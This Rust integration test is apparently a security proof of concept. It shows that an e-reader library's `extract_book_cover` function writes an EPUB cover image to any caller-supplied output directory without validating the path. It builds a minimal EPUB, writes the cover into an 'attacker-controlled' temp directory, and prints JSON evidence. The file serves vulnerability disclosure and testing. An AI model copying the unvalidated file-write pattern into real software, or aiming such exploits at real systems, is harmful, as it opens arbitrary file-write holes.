//! PoC: Cover extraction accepts unvalidated `output_dir` — path traversal demo
//!
//! This integration test demonstrates that `extract_book_cover` writes cover
//! image files to an attacker-controlled directory without validation.
//!
//! Run via: cargo test --test poc_cover_traversal -- --nocapture
//! Or use the poc.sh wrapper which captures evidence.
//!
//! Expected outcome: The cover file is written to a directory OUTSIDE the
//! intended base path, proving the traversal is successful.

use std::io::{Cursor, Write};
use std::path::Path;

// ============================================================
// 1. Minimal JPEG cover (1x1 white pixel, 107 bytes)
// ============================================================
const MINIMAL_JPEG: &[u8] = &[
    0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
    0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xff, 0xdb, 0x00, 0x43,
    0x00, 0x08, 0x06, 0x06, 0x07, 0x06, 0x05, 0x08, 0x07, 0x07, 0x07, 0x09,
    0x09, 0x08, 0x0a, 0x0c, 0x14, 0x0d, 0x0c, 0x0b, 0x0b, 0x0c, 0x19, 0x12,
    0x13, 0x0f, 0x14, 0x1d, 0x1a, 0x1f, 0x1e, 0x1d, 0x1a, 0x1c, 0x1c, 0x20,
    0x24, 0x2e, 0x27, 0x20, 0x22, 0x2c, 0x23, 0x1c, 0x1c, 0x28, 0x37, 0x29,
    0x2c, 0x30, 0x31, 0x34, 0x34, 0x34, 0x1f, 0x27, 0x39, 0x3d, 0x38, 0x32,
    0x3c, 0x2e, 0x33, 0x34, 0x32, 0xff, 0xc0, 0x00, 0x0b, 0x08, 0x00, 0x01,
    0x00, 0x01, 0x01, 0x01, 0x11, 0x00, 0xff, 0xc4, 0x00, 0x1f, 0x00, 0x00,
    0x01, 0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0xff, 0xc4, 0x00, 0xb5, 0x10, 0x00, 0x02, 0x01,
    0x03, 0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12,
    0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e,
    0x1f, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a,
    0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,
    0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42,
    0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e,
    0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a,
    0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66,
    0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72,
    0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e,
    0x7f, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a,
    0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96,
    0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2,
    0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae,
    0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba,
    0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6,
    0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2,
    0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde,
    0xdf, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea,
    0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6,
    0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff,
];

// ============================================================
// 2. Helper: create a minimal valid EPUB with cover image
// ============================================================
fn create_minimal_epub(cover_data: &[u8]) -> Vec<u8> {
    let mut buf = Cursor::new(Vec::new());
    let mut zip = zip::ZipWriter::new(&mut buf);

    // mimetype — must be first, stored (uncompressed)
    let opts: zip::write::FileOptions<'_, ()> = zip::write::FileOptions::default()
        .compression_method(zip::CompressionMethod::Stored);
    zip.start_file("mimetype", opts).unwrap();
    zip.write_all(b"application/epub+zip").unwrap();

    // META-INF/container.xml
    let opts: zip::write::FileOptions<'_, ()> = zip::write::FileOptions::default();
    zip.start_file("META-INF/container.xml", opts).unwrap();
    zip.write_all(
        br#"<?xml version="1.0"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>"#,
    ).unwrap();

    // OEBPS/content.opf — includes <meta name="cover" content="cover-image"/>
    let opts: zip::write::FileOptions<'_, ()> = zip::write::FileOptions::default();
    zip.start_file("OEBPS/content.opf", opts).unwrap();
    zip.write_all(
        br#"<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0" unique-identifier="book-id">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:opf="http://www.idpf.org/2007/opf">
    <dc:title>PoC Book</dc:title>
    <dc:creator>Security Researcher</dc:creator>
    <dc:identifier id="book-id">urn:uuid:poc-traversal-demo</dc:identifier>
    <meta name="cover" content="cover-image"/>
  </metadata>
  <manifest>
    <item id="cover-image" href="cover.jpg" media-type="image/jpeg"/>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine>
    <itemref idref="nav"/>
  </spine>
</package>"#,
    ).unwrap();

    // cover.jpg — the actual cover image resource
    let opts: zip::write::FileOptions<'_, ()> = zip::write::FileOptions::default();
    zip.start_file("OEBPS/cover.jpg", opts).unwrap();
    zip.write_all(cover_data).unwrap();

    // nav.xhtml — minimal spine item
    let opts: zip::write::FileOptions<'_, ()> = zip::write::FileOptions::default();
    zip.start_file("OEBPS/nav.xhtml", opts).unwrap();
    zip.write_all(
        br#"<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Nav</title></head><body><p>PoC</p></body></html>"#,
    ).unwrap();

    zip.finish().unwrap();
    buf.into_inner()
}

// ============================================================
// 3. Main PoC test
// ============================================================
#[tokio::test]
async fn test_cover_traversal_poc() {
    // ----- Setup: create isolated temp directories -----
    let workspace = tempfile::TempDir::new().expect("create workspace");
    let ws_path = workspace.path();

    // "Intended" cover directory (what the app SHOULD use)
    let intended_dir = ws_path.join("app_covers");
    std::fs::create_dir_all(&intended_dir).unwrap();

    // "Attacker" directory — a totally separate location outside app_covers
    let attacker_dir = ws_path.join("attacker_controlled");
    std::fs::create_dir_all(&attacker_dir).unwrap();
    let attacker_output_dir = attacker_dir.to_str().unwrap().to_string();

    println!("========== PoC: Cover Extraction Path Traversal ==========");
    println!("Intended cover directory:  {:?}", intended_dir);
    println!("Attacker-controlled dir:   {}", attacker_output_dir);
    println!("Directories are different: {}",
        intended_dir.to_str().unwrap() != attacker_output_dir
    );

    // Create a minimal EPUB with cover
    let epub_bytes = create_minimal_epub(MINIMAL_JPEG);
    let epub_path = ws_path.join("poc_book.epub");
    std::fs::write(&epub_path, &epub_bytes).expect("write epub");
    println!("EPUB size: {} bytes", epub_bytes.len());

    // ----- Exploit: call the vulnerable API -----
    // The API function (extract_book_cover) takes output_dir WITHOUT validation.
    // We pass the attacker-chosen directory instead of the intended one.
    println!("\n--- Calling extract_book_cover(output_dir = attacker_dir) ---");
    let result = rust_lib_zephyr_reader::api::cover::extract_book_cover(
        epub_path.to_str().unwrap().to_string(),
        attacker_output_dir.clone(),
    ).await;

    // ----- Verification -----
    assert!(result.is_ok(), "API call should succeed: {:?}", result);
    let returned_path = result.unwrap();
    println!("Returned path: {}", returned_path);

    let returned = Path::new(&returned_path);
    let expected = attacker_dir.join("poc_book.jpg");

    // Verify the file exists at the attacker-chosen location
    assert!(returned.exists(), "Cover file MUST exist at returned path");
    assert!(
        expected.exists(),
        "Cover file MUST exist at attacker-chosen path: {:?}",
        expected
    );

    // Verify content integrity
    let written = std::fs::read(&returned_path).expect("read cover");
    assert_eq!(written.len(), MINIMAL_JPEG.len(), "File size matches");
    assert_eq!(written, MINIMAL_JPEG, "File content matches cover image");

    // ----- Key evidence -----
    let intended_canonical = intended_dir.canonicalize().unwrap();
    let attacker_canonical = attacker_dir.canonicalize().unwrap();
    let returned_canonical = returned.canonicalize().unwrap();

    let in_intended = returned_canonical.starts_with(&intended_canonical);
    let in_attacker = returned_canonical.starts_with(&attacker_canonical);

    println!();
    println!("========== EVIDENCE ==========");
    println!("File written inside intended dir? {}", in_intended);
    println!("File written inside attacker dir? {}", in_attacker);

    if in_attacker && !in_intended {
        println!("STATUS: VULNERABILITY CONFIRMED — cover written to attacker-controlled path");
        println!(
            "The function accepted output_dir='{}' and wrote the cover file there \
             without verifying it's within the allowed cover storage area.",
            attacker_output_dir
        );
    } else {
        panic!("PoC failed: expected file in attacker dir (in_attacker={in_attacker}) but not intended dir (in_intended={in_intended})");
    }

    // ===== Structured output for poc-executor =====
    // The line below is the LAST stdout from this test and contains the
    // required JSON contract for the poc-executor to parse.
    let escaped_path = returned_path.replace('\\', "/");
    println!(
        r#"{{"status":"confirmed","evidence":"cover file written to attacker-chosen directory at {}","notes":"output_dir parameter accepted arbitrary path without validation"}}"#,
        escaped_path
    );
}
